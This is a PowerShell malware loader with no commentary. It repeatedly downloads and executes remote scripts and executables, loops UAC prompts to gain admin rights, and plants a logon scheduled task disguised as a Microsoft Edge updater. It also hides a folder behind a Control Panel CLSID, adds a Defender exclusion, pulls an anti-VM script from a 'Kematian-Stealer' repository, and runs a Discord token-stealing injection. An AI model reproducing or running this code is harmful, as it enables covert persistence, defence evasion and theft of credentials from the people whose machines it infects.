$skid = "skid"
iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/hidden.ps1" -useb)
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $startup = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup')

    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/run.cmd" -OutFile "$startup\run.cmd"
    
    while(1){try{Start-Process -Verb RunAs -FilePath '$startup\run.cmd'}catch{}}

    Remove-Item -Path "$startup\run.cmd"
    
    Stop-Process $pid -Force
}

$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$skid='$skid';iwr('https://raw.githubusercontent.com/43a1723/test/main/download.ps1')|iex`",0)(window.close)"
$task_trigger = New-ScheduledTaskTrigger -AtLogOn
$task_name = "MicrosoftEdgeUpdateTaskMachine"
$task_desc = "Keeps your Microsoft software up to date. If this task is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This task uninstalls itself when there is no Microsoft software using it."
$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description $task_desc -RunLevel Highest -Force | Out-Null

$rdir = "$env:userprofile\150F4013"
$dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
New-Item -ItemType Directory -Path $dir
attrib +h +s $dir

$temp = "$dir\temp"
New-Item -ItemType Directory -Path $temp



Add-MpPreference -ExclusionPath $dir


iex (iwr -uri "https://raw.githubusercontent.com/adasdasdsaf/Kematian-Stealer/main/frontend-src/antivm.ps1" -useb)

Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/siuu.exe" -OutFile "$dir\remote.exe"

Get-ChildItem -Path $dir | Where-Object { $_.PSIsContainer -eq $false } | ForEach-Object {
    Write-Output $_.FullName
    Start-Process -FilePath $_.FullName
}


if ($computerSystem.DomainRole -eq 1 -or $computerSystem.DomainRole -eq 2) {
    Write-Host "This is a server. Exiting..."
    exit
} else {
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/adasdasdsaf/discord-injection/main/assets/hookinjection.bat" -OutFile "$temp\injection.cmd"
    Start-Process -FilePath "$temp\injection.cmd" -WindowStyle Hidden
    
    Invoke-WebRequest -Uri "https://anonsharing.com/file/7009f5c5b68387ce/new.exe" -OutFile "$temp\skid.exe"
    Start-Process -FilePath "$temp\skid.exe"
}




